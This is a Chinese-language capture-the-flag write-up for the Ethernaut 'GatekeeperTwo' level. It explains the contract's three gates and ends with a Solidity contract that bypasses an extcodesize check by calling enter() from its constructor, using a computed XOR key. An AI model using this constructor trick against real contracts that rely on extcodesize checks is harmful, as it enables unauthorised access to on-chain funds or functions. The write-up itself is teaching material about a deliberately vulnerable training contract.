# GateKeeper Two

## 要求
```
这个守门人带来了一些新的挑战, 同样的需要注册为参赛者来完成这一关

这可能有帮助:
想一想你从上一个守门人那学到了什么.
第二个门中的 assembly 关键词可以让一个合约访问非原生的 vanilla solidity 功能. 参见 here . extcodesize 函数可以用来得到给定地址合约的代码长度 - 你可以在这个页面学习到更多 yellow paper.
^ 符号在第三个门里是位操作 (XOR), 在这里是代表另一个常见的位操作 (参见 here). Coin Flip 关卡也是一个很好的参考.
```

## 代码
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperTwo {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        uint256 x;
        assembly {
            x := extcodesize(caller())
        }
        require(x == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}
```

## 分析

- 第一个`gateOne`就不分析了，和[14-GatekeeperOne](./14-Gatekeeper%20One.md) 一样的。

- `gateTwo`.这里使用到了solidity的汇编。
```solidity
    modifier gateTwo() {
        uint256 x;
        assembly {
            x := extcodesize(caller())
        }
        require(x == 0);
        _;
    }
```
其中汇编的意思就是，获取调用者的合约大小。也就是我们写的攻击合约。同时需要`require(x == 0);`。经过查找资料，发现只要是在调用合约的构造函数中进行攻击，因为构造函数还没运行完毕，所以此时获取调用者的合约大小，返回值都是0.


- `gateThree`就更简单了，直接运算就好。


## pwn
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GateKeeperTwoPwn {
    constructor(address _target){
        bytes8 gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this)))))^type(uint64).max);
        address(_target).call(abi.encodeWithSignature("enter(bytes8)", gateKey));
    }
}
```